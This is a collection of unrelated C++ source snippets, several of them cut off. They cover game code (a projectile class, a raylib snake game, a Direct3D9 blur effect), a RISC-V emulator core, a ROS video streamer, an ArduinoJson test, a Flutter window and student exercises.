    "/* Implementation file for projectiles */\n\n#include <SFML/Graphics.hpp>\n#include \"Projectile.h\"\n#include <cmath>\n#include <iostream>\n\n\n// Constructor\nProjectile::Projectile(float size, float positionX, float positionY, float velocityX, float velocityY, float playerAngle) {\n    \n    // Positions projectile respective to player\n    playerAngle = playerAngle - (3.14 / 2);\n    \n    float offsetX = 20 * cos(playerAngle);\n    float offsetY = 20 * sin(playerAngle);\n\n    this->playerAngle = playerAngle;\n\n    position = {positionX + offsetX, positionY + offsetY};\n    velocity = {2 * (velocityX * cos(playerAngle)), 2 * (velocityY * sin(playerAngle))};\n    radius = size;\n\n    // Creates sprite\n    sf::Sprite myProjectile;\n    projectile = myProjectile;\n\n    projectile.setPosition(position.first, position.second);\n    projectile.setRotation((3.14 / 2 + playerAngle) * 180.0 / 3.14);\n\n}\n\n// Draws projectile and moves it\nvoid Projectile::drawProjectile(sf::RenderWindow &window) {\n    projectile.move(velocity.first, velocity.second);\n    window.draw(projectile);\n}\n\n// Gets radius\nint Projectile::getRadius() {\n    return radius;\n}\n\nvoid Projectile::setProjectileTexture(sf::Texture& texture) {\n    projectile.setTexture(texture);\n}\n\n// Destructor\nProjectile::~Projectile() {\n    \n}",
    "///                                                                           \n/// Langulus::Module::Network                                                 \n/// Copyright (c) 2024 Dimo Markov <team@langulus.com>                        \n/// Part of the Langulus framework, see https://langulus.com                  \n///                                                                           \n/// SPDX-License-Identifier: GPL-3.0-or-later                                 \n///                                                                           \n#include \"Client.hpp\"\n#include \"Network.hpp\"\n\n\n/// Gatherer construction                                                     \n///   @param producer - the system producer                                   \n///   @param descriptor - instructions for configuring the GUI                \nClient::Client(Network* producer, const Neat& descriptor)\n   : Resolvable   {this}\n   , ProducedFrom {producer, descriptor} {\n   VERBOSE_NETWORK(\"Initializing...\");\n   Couple(descriptor);\n   VERBOSE_NETWORK(\"Initialized\");\n}\n\n/// Shutdown the client                                                       \nClient::~Client() {\n\n}\n\n/// Produce shared objects                                                    \n///   @param verb - creation verb to satisfy                                  \nvoid Client::Create(Verb& verb) {\n   mShared.Create(this, verb);\n}\n\n/// React on environmental change                                             \nvoid Client::Refresh() {\n\n}\n",
    "#include \"_cpu.h\"\n\n#define MASK_PPN_1 0xfff00000\n\n#define MAKE_MEM_RW_RESULT_OK(_VAL_) ((unsigned long long)(_VAL_))<<32\n#define GET_MEM_RW_RESULT_VAL(_VAL_) ((unsigned int)(_VAL_>>32))\n\nvoid Cpu_::_init()\n{\n\tregs.pc = 0;\n\tfor (auto i = 0; i < 32; i++)\n\t\tregs.x[i] = 0;\n\tfor (auto i = 0; i < 4096; i++)\n\t\tCSRs[i] = 0;\n\tMode = MODE_MACHINE;\n\t*reinterpret_cast<unsigned int*>(&debugflags) = 0;\n\tdebugflags.flag_run = 1;\n\tdebugflags.one_step = 0;\n}\n\nunsigned int Cpu_::ALUoperation(unsigned int a, unsigned int b, Instruction ins)\n{\n\tunsigned int ret;\n\tif (ins.bType.opcode == OP_ALU_IMM && \n\t\tins.rType.funct3 != 0b101) \n\t\tins.rType.funct7 = 0;\n\n\tswitch (ins.rType.funct3)\n\t{\n\tcase 0:\n\t\tret = ins.rType.funct7 == 0b0100000 ? a - b : a + b;\n\t\tbreak;\n\tcase 1:\n\t\tret = a << b;\n\t\tbreak;\n\tcase 2:\n\t\tret = static_cast<int>(a) < static_cast<int>(b) ? 1 : 0;\n\t\tbreak;\n\tcase 3:\n\t\tret = a < b ? 1 : 0;\n\t\tbreak;\n\tcase 4:\n\t\tret = a ^ b;\n\t\tbreak;\n\tcase 5:\n\t\tb &= 31;\n\t\tif (ins.rType.funct7 == 0b0100000) {\n\t\t\tret = a >> b;\n\t\t\tret |= ((0xffffffff >> b) ^ 0xffffffff);\n\t\t}\n\t\telse ret = a >> b;\n\t\tbreak;\n\tcase 6:\n\t\tret = a | b;\n\t\tbreak;\n\tcase 7:\n\t\tret = a & b;\n\t\tbreak;\n\t}\n\treturn ret;\n}\n\nvoid Cpu_::ins_exec(Instruction ins)\n{\n\tif (regs.pc & 3) {\n\t\t_make_exception(EXC_INSTRUCTION_ADDR_NOT_ALIGNED,*reinterpret_cast<unsigned int*>(&ins));\n\t\treturn;\n\t}\n\tswitch (ins.rType.opcode)\n\t{\n\tcase OP_ALU:\n\t\tif (ins.rType.rd != 0)\n\t\t\tregs.x[ins.rType.rd] =\n\t\t\tALUoperation(regs.x[ins.rType.rs1], regs.x[ins.rType.rs2], ins);\n\t\tbreak;\n\tcase OP_ALU_IMM:\n\t\tif (ins.rType.rd != 0)\n\t\t\tregs.x[ins.iType.rd] =\n\t\t\tALUoperation(regs.x[ins.iType.rs1], immgen(ins), ins);\n\t\tbreak;\n\tcase OP_LOAD:\n\t{\n\t\tunsigned long long _ret_buf;\n\t\tunsigned int addr = static_cast<int>(regs.x[ins.iType.rs1]) + static_cast<int>(immgen(ins));\n\t\tswitch (ins.iType.funct3)\n\t\t{\n\t\tcase 0://lb\n\t\t\t_ret_buf = memctrl.read8(addr, Mode);\n\t\t\tif (_ret_buf & 0xffffffff) {\n\t\t\t\t_make_mem_exception(_ret_buf & 0xffffffff, IOF_READ);\n\t\t\t\tCSRs[(int)CSRid::mtval] = addr;\n\t\t\t\tEXEC_INS1_ABORT;\n\t\t\t}\n\t\t\tif (ins.iType.rd != 0) regs.x[ins.iType.rd] = _sign_ext<8>(GET_MEM_RW_RESULT_VAL(_ret_buf));\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\t_ret_buf = memctrl.read16(addr, Mode);\n\t\t\tif (_ret_buf & 0xffffffff) {\n\t\t\t\t_make_mem_exception(_ret_buf & 0xffffffff,IOF_READ);\n\t\t\t\tCSRs[(int)CSRid::mtval] = addr;\n\t\t\t\tEXEC_INS1_ABORT;\n\t\t\t}\n\t\t\tif (ins.iType.rd != 0) regs.x[ins.iType.rd] = _sign_ext<16>(GET_MEM_RW_RESULT_VAL(_ret_buf));\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\t_ret_buf = memctrl.read32(addr, Mode);\n\t\t\tif (_ret_buf & 0xffffffff) {\n\t\t\t\t_make_mem_exception(_ret_buf & 0xffffffff,IOF_READ);\n\t\t\t\tCSRs[(int)CSRid::mtval] = addr;\n\t\t\t\tEXEC_INS1_ABORT;\n\t\t\t}\n\t\t\tif (ins.iType.rd != 0) regs.x[ins.iType.rd] =GET_MEM_RW_RESULT_VAL(_ret_buf);\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\t_ret_buf = memctrl.read32(addr, Mode);\n\t\t\tif (_ret_buf & 0xffffffff) {\n\t\t\t\t_make_mem_exception(_ret_buf & 0xffffffff, IOF_READ);\n\t\t\t\tCSRs[(int)CSRid::mtval] = addr;\n\t\t\t\tEXEC_INS1_ABORT;\n\t\t\t}\n\t\t\tif (ins.iType.rd != 0) regs.x[ins.iType.rd] = GET_MEM_RW_RESULT_VAL(_ret_buf);\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\t_ret_buf = memctrl.read32(addr, Mode);\n\t\t\tif (_ret_buf & 0xffffffff) {\n\t\t\t\t_make_mem_exception(_ret_buf & 0xffffffff, IOF_READ);\n\t\t\t\tCSRs[(int)CSRid::mtval] = addr;\n\t\t\t\tEXEC_INS1_ABORT;\n\t\t\t}\n\t\t\tif (ins.iType.rd != 0) regs.x[ins.iType.rd] = GET_MEM_RW_RESULT_VAL(_ret_buf);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tthis->_make_exception(EXC_INV_INSTRUCTION, *reinterpret_cast<unsigned int*>(&ins));\n\t\t\treturn;\n\t\t}\n\t}\n\tbreak;\n\tcase OP_STORE: \n\t{\n\t\tunsigned int _ret_buf;\n\t\tunsigned int addr = static_cast<int>(regs.x[ins.sType.rs1]) + static_cast<int>(immgen(ins));\n\t\tswitch (ins.sType.funct3)\n\t\t{\n\t\tcase 0:\n\t\t\t_ret_buf = memctrl.write8(addr, regs.x[ins.sType.rs2], Mode);\n\t\t\tif (_ret_buf != 0) {\n\t\t\t\t_make_mem_exception(_ret_buf, IOF_WRITE);\n\t\t\t\tCSRs[(int)CSRid::mtval] = addr;\n\t\t\t\tEXEC_INS1_ABORT;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\t_ret_buf = memctrl.write16(addr, regs.x[ins.sType.rs2], Mode);\n\t\t\tif (_ret_buf != 0) {\n\t\t\t\t_make_mem_exception(_ret_buf, IOF_WRITE);\n\t\t\t\tCSRs[(int)CSRid::mtval] = addr;\n\t\t\t\tEXEC_INS1_ABORT;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\t_ret_buf = memctrl.write32(addr, regs.x[ins.sType.rs2], Mode);\n\t\t\tif (_ret_buf != 0) {\n\t\t\t\t_make_mem_exception(_ret_buf, IOF_WRITE);\n\t\t\t\tCSRs[(int)CSRid::mtval] = addr;\n\t\t\t\tEXEC_INS1_ABORT;\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\t_make_exception(EXC_INV_INSTRUCTION, *reinterpret_cast<unsigned int*>(&ins));\n\t\t\treturn;\n\t\t}\n\t}\n\tbreak;\n\tcase OP_BTYPE:\n\t{\n\t\tbool if_jmp;\n\t\tswitch (ins.bType.funct3)\n\t\t{\n\t\tcase 0:\n\t\t\tif_jmp = regs.x[ins.bType.rs1] == regs.x[ins.bType.rs2];\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\tif_jmp = regs.x[ins.bType.rs1] != regs.x[ins.bType.rs2];\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tif_jmp = static_cast<int>(regs.x[ins.bType.rs1]) < static_cast<int>(regs.x[ins.bType.rs2]);\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\tif_jmp = static_cast<int>(regs.x[ins.bType.rs1]) >= static_cast<int>(regs.x[ins.bType.rs2]);\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tif_jmp = regs.x[ins.bType.rs1] < regs.x[ins.bType.rs2];\n\t\t\tbreak;\n\t\tcase 7:\n\t\t\tif_jmp = regs.x[ins.bType.rs1] >= regs.x[ins.bType.rs2];",
    "#include <iostream>\n#include <queue>\n#include <vector>\n\nusing namespace std;\n\nint main() {\n    int n, b;\n    cin >> n >> b;\n\n    vector<pair<int, int>> queries(n);\n    for (int i = 0; i < n; i++) {\n        cin >> queries[i].first >> queries[i].second;\n    }\n\n    queue<pair<int, int>> q; // H\u00e0ng d?i c\u00e1c y\u00eau c?u\n    vector<int> end_times(n, -1); // Th?i di?m ho\u00e0n th\u00e0nh c?a c\u00e1c y\u00eau c?u\n    long long current_time = 0; // Th?i di?m hi?n t?i c?a m\u00e1y ch?\n\n    for (int i = 0; i < n; i++) {\n        int ti = queries[i].first;\n        int di = queries[i].second;\n\n        // X? l\u00fd c\u00e1c y\u00eau c?u d\u00e3 ho\u00e0n th\u00e0nh trong h\u00e0ng d?i tru?c khi x? l\u00fd y\u00eau c?u m?i\n        while (!q.empty() && current_time <= ti) {\n            int query_index = q.front().first;\n            int duration = q.front().second;\n            q.pop();\n\n            current_time = max(current_time, (long long)queries[query_index].first) + duration;\n            end_times[query_index] = current_time;\n        }\n\n        if (current_time <= ti) {\n            // M\u00e1y ch? r?nh t?i th?i di?m ti, b?t d?u x? l\u00fd y\u00eau c?u n\u00e0y\n            current_time = ti + di;\n            end_times[i] = current_time;\n        } else if (q.size() < (unsigned int)b) {\n            // M\u00e1y ch? dang b?n, th\u00eam y\u00eau c?u n\u00e0y v\u00e0o h\u00e0ng d?i n?u c\u00f2n ch?\n            q.push({i, di});\n        } else {\n            // M\u00e1y ch? dang b?n v\u00e0 h\u00e0ng d?i d?y, t? ch?i y\u00eau c?u n\u00e0y\n            end_times[i] = -1;\n        }\n    }\n\n    // X? l\u00fd c\u00e1c y\u00eau c?u c\u00f2n l?i trong h\u00e0ng d?i\n    while (!q.empty()) {\n        int query_index = q.front().first;\n        int duration = q.front().second;\n        q.pop();\n\n        current_time = max(current_time, (long long)queries[query_index].first) + duration;\n        end_times[query_index] = current_time;\n    }\n\n    for (int i = 0; i < n; i++) {\n        cout << end_times[i] << \" \";\n    }\n    cout << endl;\n\n    return 0;\n}\n\n",
    "# include <bits/stdc++.h>\n\n# include <raylib.h>\n\n# include <deque>\n\n# include <raymath.h>\n\nusing namespace std;\n\nColor Green={173,204,96,255};\n\nColor DarkGreen={43,51,24,255};\n\nint cellSize=30;\n\nint cellCount=25;\n\nint offSet=75;\n\ndouble lastUpdateTime=0;\n\nbool ElementInDeque(Vector2 element,deque<Vector2> deque){\n\n for(unsigned int i=0;i<deque.size();i++){\n\n   if(Vector2Equals(deque[i],element)){\n\n      return true;\n\n   }\n\n }\n\n return false;\n\n}\n\nbool eventTriggered(double interval){\n\n    double currentTime=GetTime();\n\n    if(currentTime-lastUpdateTime>=interval){\n\n           lastUpdateTime=currentTime;\n\n           return true;\n\n    }\n\n    return false;\n\n}\n\nclass Snake{\n\n public:\n\n  deque<Vector2>body={Vector2{6,9},Vector2{5,9},Vector2{4,9}};\n\n  Vector2 direction={1,0};\n\n  bool addSegment=false;\n\n  void Draw(){\n\n    for(long long unsigned int i=0;i<body.size();i++){\n\n       float x=body[i].x;\n\n       float y=body[i].y;\n\n      Rectangle segment=Rectangle{offSet+x*cellSize,offSet+y*cellSize,(float)cellSize,(float)cellSize};\n\n      DrawRectangleRounded(segment,0.5,6,DarkGreen); \n\n    }\n\n  }\n\n  void Update(){\n\n     body.push_front(Vector2Add(body[0],direction));\n\n     if(addSegment==true){\n\n       addSegment=false;\n\n     }else{\n\n     body.pop_back();\n\n     }\n\n     \n\n  }\n\n  void Reset(){\n\n    body={Vector2{6,9},Vector2{5,9},Vector2{4,9}};\n\n    direction={1,0};\n\n  }\n\n};\n\nclass Food{\n\n public:\n\n  Vector2 position;\n\n  Texture2D texture;\n\n Food(deque<Vector2> snakeBody){\n\n   Image image=LoadImage(\"Graphics/food.png\");\n \n   texture=LoadTextureFromImage(image);\n\n   UnloadImage(image);\n\n   position=GenerateRandomPos(snakeBody);\n\n }\n\n ~Food(){\n\n   UnloadTexture(texture);\n\n }\n\n void Draw(){\n\n    DrawTexture(texture,offSet+position.x*cellSize,offSet+position.y*cellSize,WHITE);\n\n }\n\n Vector2 GenerateRandomCell(){\n\n     float x=GetRandomValue(0,cellCount-1);\n\n     float y=GetRandomValue(0,cellCount-1);      \n\n     return Vector2{x,y};\n\n }\n\n Vector2 GenerateRandomPos(deque<Vector2> snakeBody){\n\n\n\n     Vector2 position=GenerateRandomCell();\n\n     while(ElementInDeque(position,snakeBody)){\n\n          position=GenerateRandomCell();\n\n     }\n\n     return position;\n\n   \n\n }\n\n};\n\nclass Game{\n\n  public:\n\n  Snake snake=Snake();\n\n  Food food=Food(snake.body);\n\n  bool running=true;\n\n  int score=0;\n\n  Sound eatSound;\n\n  Sound wallSound;\n\n  Game(){\n\n   InitAudioDevice();\n\n   eatSound=LoadSound(\"Sounds/eat.mp3\");\n\n   wallSound=LoadSound(\"Sounds/wall.mp3\");\n\n  }\n\n  ~Game(){\n\n      InitAudioDevice();\n\n      UnloadSound(eatSound);\n\n      UnloadSound(wallSound);\n\n      CloseAudioDevice();\n\n  }\n\n  void Draw(){\n\n      food.Draw();\n\n      snake.Draw();\n\n  }\n\n  void Update(){\n\n    if(running){\n\n       snake.Update();\n\n     checkCollisionWithFood();\n\n     checkCollisonWithEdges();\n\n     checkCollisionWithTail();\n\n    }\n\n    \n\n  }\n\n  void checkCollisionWithFood(){\n\n      if(Vector2Equals(snake.body[0],food.position)){\n\n        food.position=food.GenerateRandomPos(snake.body);\n\n        snake.addSegment=true;\n\n        score++;\n\n        PlaySound(eatSound);\n\n      }\n\n  }\n\n  void checkCollisonWithEdges(){\n\n      if(snake.body[0].x==cellCount || snake.body[0].x==-1){\n\n           GameOver();\n\n      }\n\n      if(snake.body[0].y==25 || snake.body[0].y==-1){\n\n          GameOver();\n\n      }\n\n     \n\n  }\n\n  void GameOver(){\n\n       snake.Reset();\n\n       food.position=food.GenerateRandomPos(snake.body);\n\n       running=false;\n\n       score=0;\n\n       PlaySound(wallSound);\n\n  }\n\n  void checkCollisionWithTail(){\n\n        deque<Vector2> headLessBody=snake.body;\n\n        headLessBody.pop_front();\n\n        if(ElementInDeque(snake.body[0],headLessBody)){\n\n           GameOver();\n\n        }\n\n  }\n\n};\n\nint main(){\n\n InitWindow(2*offSet+cellSize*cellCount,2*offSet+cellSize*cellCount,\"Snake Game\");\n\n SetTargetFPS(60);\n\n Game game=Game();\n\n //Game Loop\n\n while(WindowShouldClose()==false){\n\n     //1. Event handling\n     //2. Updating Positions\n\n     if(eventTriggered(0.2)){\n\n         game.Update();\n\n     }\n\n     if(IsKeyPressed(KEY_UP) && game.snake.direction.y!=1){\n\n         game.snake.direction={0,-1};\n\n         game.running=true;\n\n     }\n\n      if(IsKeyPressed(KEY_DOWN)&& game.snake.direction.y!=-1){\n\n         game.snake.direction={0,1};\n\n         game.running=true;\n\n\n     }\n\n      if(IsKeyPressed(KEY_RIGHT) && game.snake.direction.x!=-1){\n\n         game.snake.direction={1,0};\n\n          game.running=true;\n\n\n     }\n\n      if(IsKeyPressed(KEY_LEFT) && game.snake.direction.x!=1){\n\n         game.snake.direction={-1,0};\n\n          game.running=true;\n\n\n     }   \n\n     //3. Drawing\n\n     BeginDrawing();\n\n     ClearBackground(Green);\n\n     DrawRectangleLinesEx(Rectangle{(float)offSet-5,(float)offSet-5,(float)cellSize*cellCount+10,(float)cellSize*cellCount+10},5,DarkGreen);\n\n     DrawText(\"Retro Snake\",offSet-5,20,40,DarkGreen);\n\n     DrawText(TextFormat(\"%i\",game.score),offSet-5,offSet+cellSize*cellCount+10,40,DarkGreen);\n\n     game.Draw();\n\n     EndDrawing();\n\n\n }\n\n CloseWindow(",
    "#include \"web_video_server/h264_streamer.h\"\n\nnamespace web_video_server\n{\n\nH264Streamer::H264Streamer(const async_web_server_cpp::HttpRequest& request,\n                         async_web_server_cpp::HttpConnectionPtr connection, ros::NodeHandle& nh) :\n    LibavStreamer(request, connection, nh, \"mp4\", \"libx264\", \"video/mp4\")\n{\n  /* possible quality presets:\n   * ultrafast, superfast, veryfast, faster, fast, medium, slow, slower, veryslow, placebo\n   * no latency improvements observed with ultrafast instead of medium\n   */\n  preset_ = request.get_query_param_value_or_default(\"preset\", \"ultrafast\");\n}\n\nH264Streamer::~H264Streamer()\n{\n}\n\nvoid H264Streamer::initializeEncoder()\n{\n  av_opt_set(codec_context_->priv_data, \"preset\", preset_.c_str(), 0);\n  av_opt_set(codec_context_->priv_data, \"tune\", \"zerolatency\", 0);\n  av_opt_set_int(codec_context_->priv_data, \"crf\", 20, 0);\n  av_opt_set_int(codec_context_->priv_data, \"bufsize\", 100, 0);\n  av_opt_set_int(codec_context_->priv_data, \"keyint\", 30, 0);\n  av_opt_set_int(codec_context_->priv_data, \"g\", 1, 0);\n\n  // container format options\n  if (!strcmp(format_context_->oformat->name, \"mp4\")) {\n    // set up mp4 for streaming (instead of seekable file output)\n    av_dict_set(&opt_, \"movflags\", \"+frag_keyframe+empty_moov+faststart\", 0);\n  }\n}\n\nH264StreamerType::H264StreamerType() :\n    LibavStreamerType(\"mp4\", \"libx264\", \"video/mp4\")\n{\n}\n\nboost::shared_ptr<ImageStreamer> H264StreamerType::create_streamer(const async_web_server_cpp::HttpRequest& request,\n                                                                  async_web_server_cpp::HttpConnectionPtr connection,\n                                                                  ros::NodeHandle& nh)\n{\n  return boost::shared_ptr<ImageStreamer>(new H264Streamer(request, connection, nh));\n}\n\n}\n",
    "// ArduinoJson - https://arduinojson.org\n// Copyright \u00a9 2014-2024, Benoit BLANCHON\n// MIT License\n\n#include <ArduinoJson.h>\n#include <catch.hpp>\n\nTEST_CASE(\"serialize MsgPack to various destination types\") {\n  JsonDocument doc;\n  JsonObject object = doc.to<JsonObject>();\n  object[\"hello\"] = \"world\";\n  const char* expected_result = \"\\x81\\xA5hello\\xA5world\";\n  const size_t expected_length = 13;\n\n  SECTION(\"std::string\") {\n    std::string result;\n    size_t len = serializeMsgPack(object, result);\n\n    REQUIRE(expected_result == result);\n    REQUIRE(expected_length == len);\n  }\n\n  /*  SECTION(\"std::vector<char>\") {\n      std::vector<char> result;\n      size_t len = serializeMsgPack(object, result);\n\n      REQUIRE(std::vector<char>(expected_result, expected_result + 13) ==\n    result);\n    REQUIRE(expected_length == len);\n    } */\n\n  SECTION(\"char[] larger than needed\") {\n    char result[64];\n    memset(result, 42, sizeof(result));\n    size_t len = serializeMsgPack(object, result);\n\n    REQUIRE(expected_length == len);\n    REQUIRE(std::string(expected_result, len) == std::string(result, len));\n    REQUIRE(result[len] == 42);\n  }\n\n  SECTION(\"char[] of the right size\") {  // #1545\n    char result[13];\n    size_t len = serializeMsgPack(object, result);\n\n    REQUIRE(expected_length == len);\n    REQUIRE(std::string(expected_result, len) == std::string(result, len));\n  }\n\n  SECTION(\"char*\") {\n    char result[64];\n    memset(result, 42, sizeof(result));\n    size_t len = serializeMsgPack(object, result, 64);\n\n    REQUIRE(expected_length == len);\n    REQUIRE(std::string(expected_result, len) == std::string(result, len));\n    REQUIRE(result[len] == 42);\n  }\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"globals.hpp\"\n#include <wrl/client.h>\n#include \"imgui/shader_blur_x.h\"\n#include \"imgui/shader_blur_y.h\"\n\nusing Microsoft::WRL::ComPtr;\n\nstatic int backbufferWidth = 0;\nstatic int backbufferHeight = 0;\n\nstatic IDirect3DDevice9* device;\n\n[[nodiscard]] static IDirect3DTexture9* create_texture(int width, int height) noexcept\n{\n\tIDirect3DTexture9* texture;\n\tdevice->CreateTexture(width, height, 1, D3DUSAGE_RENDERTARGET, D3DFMT_X8R8G8B8, D3DPOOL_DEFAULT, &texture, nullptr);\n\treturn texture;\n}\n\nstatic void copy_back_buffer_to_texture(IDirect3DTexture9* texture, D3DTEXTUREFILTERTYPE filtering) noexcept\n{\n\tComPtr< IDirect3DSurface9 > backBuffer;\n\tif (device->GetBackBuffer(0, 0, D3DBACKBUFFER_TYPE_MONO, backBuffer.GetAddressOf()) == D3D_OK)\n\t{\n\t\tComPtr< IDirect3DSurface9 > surface;\n\t\tif (texture->GetSurfaceLevel(0, surface.GetAddressOf()) == D3D_OK)\n\t\t\tdevice->StretchRect(backBuffer.Get(), nullptr, surface.Get(), nullptr, filtering);\n\t}\n}\n\nstatic void set_render_target(IDirect3DTexture9* rtTexture) noexcept\n{\n\tComPtr< IDirect3DSurface9 > surface;\n\tif (rtTexture->GetSurfaceLevel(0, surface.GetAddressOf()) == D3D_OK)\n\t\tdevice->SetRenderTarget(0, surface.Get());\n}\n\nclass c_shader_program\n{\npublic:\n\t~c_shader_program()\n\t{\n\t}\n\n\tvoid use(float uniform, int location) const noexcept\n\t{\n\t\tdevice->SetPixelShader(pixel_shader.Get());\n\t\tconst float params[4] = { uniform };\n\t\tdevice->SetPixelShaderConstantF(location, params, 1);\n\t}\n\n\tvoid init(const BYTE* pixelShaderSrc) noexcept\n\t{\n\t\tif (initialized)\n\t\t\treturn;\n\n\t\tinitialized = true;\n\t\tdevice->CreatePixelShader(reinterpret_cast<const DWORD*>(pixelShaderSrc), pixel_shader.GetAddressOf());\n\t}\n\nprivate:\n\tComPtr< IDirect3DPixelShader9 > pixel_shader{};\n\tbool initialized = false;\n};\n\nclass c_blur_effect\n{\npublic:\n\tstatic void draw(ImDrawList* drawList, ImVec2 min, ImVec2 max, ImColor col, float rounding, ImDrawCornerFlags round_flags) noexcept\n\t{\n\t\tinstance()._draw(drawList, min, max, col, rounding, round_flags);\n\t}\n\n\tstatic void clear_textures() noexcept\n\t{\n\t\tif (instance().blur_texture1)\n\t\t{\n\t\t\tinstance().blur_texture1->Release();\n\t\t\tinstance().blur_texture1 = nullptr;\n\t\t}\n\t\tif (instance().blur_texture2)\n\t\t{\n\t\t\tinstance().blur_texture2->Release();\n\t\t\tinstance().blur_texture2 = nullptr;\n\t\t}\n\t}\n\n\tstatic void create_textures() noexcept\n\t{\n\t\tif (!instance().blur_texture1)\n\t\t\tinstance().blur_texture1 = create_texture(backbufferWidth / blur_down_sample, backbufferHeight / blur_down_sample);\n\t\tif (!instance().blur_texture2)\n\t\t\tinstance().blur_texture2 = create_texture(backbufferWidth / blur_down_sample, backbufferHeight / blur_down_sample);\n\t}\n\n\tstatic void create_shaders() noexcept\n\t{\n\t\tinstance().blur_shaderx.init(blur_x);\n\t\tinstance().blur_shadery.init(blur_y);\n\t}\n\nprivate:\n\tD3DMATRIX backup_matrix{};\n\n\tIDirect3DSurface9* rt_backup = nullptr;\n\tIDirect3DTexture9* blur_texture1 = nullptr;\n\tIDirect3DTexture9* blur_texture2 = nullptr;\n\n\tc_shader_program blur_shaderx{};\n\tc_shader_program blur_shadery{};\n\tstatic constexpr auto blur_down_sample = 9;\n\n\tc_blur_effect() = default;\n\tc_blur_effect(const c_blur_effect&) = delete;\n\n\t~c_blur_effect()\n\t{\n\t\tif (rt_backup)\n\t\t\trt_backup->Release();\n\t\tif (blur_texture1)\n\t\t\tblur_texture1->Release();\n\t\tif (blur_texture2)\n\t\t\tblur_texture2->Release();\n\t}\n\n\tstatic c_blur_effect& instance() noexcept\n\t{\n\t\tstatic c_blur_effect blurEffect;\n\t\treturn blurEffect;\n\t}\n\n\tstatic void begin(const ImDrawList*, const ImDrawCmd*) noexcept\n\t{\n\t\tinstance()._begin();\n\t}\n\tstatic void first_pass(const ImDrawList*, const ImDrawCmd*) noexcept\n\t{\n\t\tinstance()._first_pass();\n\t}\n\tstatic void second_pass(const ImDrawList*, const ImDrawCmd*) noexcept\n\t{\n\t\tinstance()._second_pass();\n\t}\n\tstatic void end(const ImDrawList*, const ImDrawCmd*) noexcept\n\t{\n\t\tinstance()._end();\n\t}\n\n\tvoid _begin() noexcept\n\t{\n\t\tdevice->GetRenderTarget(0, &rt_backup);\n\t\tcopy_back_buffer_to_texture(blur_texture1, D3DTEXF_LINEAR);\n\t\tdevice->SetSamplerState(0, D3DSAMP_ADDRESSU, D3DTADDRESS_CLAMP);\n\t\tdevice->SetSamplerState(0, D3DSAMP_ADDRESSV, D3DTADDRESS_CLAMP);\n\t\tdevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);\n\n\t\tdevice->GetVertexShaderConstantF(0, &backup_matrix.m[0][0], 4);\n\n\t\tconst D3DMATRIX projection{ { { 1.0f, 0.0f, 0.0f, 0.0f, 0.0f, 1.0f, 0.0f, 0.0f, 0.0f, 0.0f, 1.0f, 0.0f, -1.0f / (backbufferWidth / blur_down_sample), 1.0f / (backbufferHeight / blur_down_sample), 0.0f, 1.0f } } };\n\t\tdevice->SetVertexShaderConstantF(0, &projection.m[0][0], 4);\n\t}\n\n\tvoid _first_pass() noexcept\n\t{\n\t\tblur_shaderx.use(1.0f / (backbufferWidth / blur_down_sample), 0);\n\t\tset_render_target(blur_texture2);\n\t}\n\n\tvoid _second_pass() noexcept\n\t{\n\t\tblur_shadery.use(1.0f / (backbufferHeight / blur_down_sample), 0);\n\t\tset_render_target(blur_texture1);\n\t}\n\n\tvoid _end() noexcept\n\t{\n\t\tdevice->SetRenderTarget(0, rt_backup);\n\t\trt_backup->Release();\n\n\t\tdevice->SetPixelShader(nullptr);\n\t\tdevice->SetRenderState(D3DRS_SCISSORTESTENABLE, true);\n\t}\n\n\tvoid _draw(ImDrawList* drawList, ImVec2 min, ImVec2 max, ImColor col, float rounding",
    "/*\n  Name: Temitope Oladimeji Samuel Adebayo\n\n  I have done all the coding by myself and only copied the code that my professor provided \n  to complete my workshops and assignments.\n*/\n\n// Workshop 9 - Multi-Threading, Thread Class\n// process_data.cpp\n// 2021/1/5 - Jeevan Pant\n// 2023/11/17 - Cornel\n\n#include <string>\n#include <iostream>\n#include <fstream>\n#include <functional>\n#include <vector>\n#include <thread>\n#include \"process_data.h\"\n\nnamespace sdds\n{\n\t// The following function receives array (pointer) as the first argument, number of array \n\t//   elements (size) as second argument, divisor as the third argument, and avg as fourth argument. \n\t//   size and divisor are not necessarily same. When size and divisor hold same value, avg will \n\t//   hold average of the array elements. When they are different, avg will hold a value called \n\t// \t 